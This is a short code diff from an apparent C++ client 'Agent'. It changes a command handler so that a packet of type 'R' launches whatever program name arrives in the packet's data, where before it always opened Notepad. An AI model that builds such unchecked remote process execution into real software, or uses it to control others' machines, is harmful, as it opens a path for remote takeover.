@@ -53,7 +53,7 @@ void Agent::handleClient() {
             break;
         }
         case 'R': {
-            MyCreateProcess("C:\\Windows\\notepad.exe");
+            MyCreateProcess(packet.m_data);
             break;
         }
         default:
